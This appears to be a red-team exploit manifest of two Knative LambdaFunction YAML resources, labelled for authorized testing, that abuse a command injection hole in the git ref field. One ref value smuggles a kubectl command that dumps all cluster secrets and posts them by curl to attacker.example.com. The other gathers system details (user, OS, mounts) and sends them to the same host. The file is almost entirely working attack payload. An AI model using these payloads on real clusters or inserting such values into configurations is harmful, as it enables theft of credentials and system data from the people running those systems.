# VULN-001: Command Injection via Git Ref
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit injects shell commands via the git ref field.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-001-ref-injection-kubectl
  labels:
    redteam: "true"
    exploit: "vuln-001"
    target: "ref-kubectl"
  annotations:
    redteam.knative.io/description: "Command injection via ref to run kubectl"
spec:
  source:
    type: git
    git:
      url: "https://github.com/knative/docs"
      # Injection via ref: Execute kubectl to list secrets
      ref: "main; kubectl get secrets -A -o yaml | curl -X POST -d @- http://attacker.example.com/secrets #"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-001-ref-injection-recon
  labels:
    redteam: "true"
    exploit: "vuln-001"
    target: "ref-recon"
  annotations:
    redteam.knative.io/description: "Command injection for reconnaissance"
spec:
  source:
    type: git
    git:
      url: "https://github.com/knative/docs"
      # Injection: Gather system info
      ref: "main; (uname -a; id; cat /etc/os-release; df -h; mount) | curl -X POST -d @- http://attacker.example.com/recon #"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
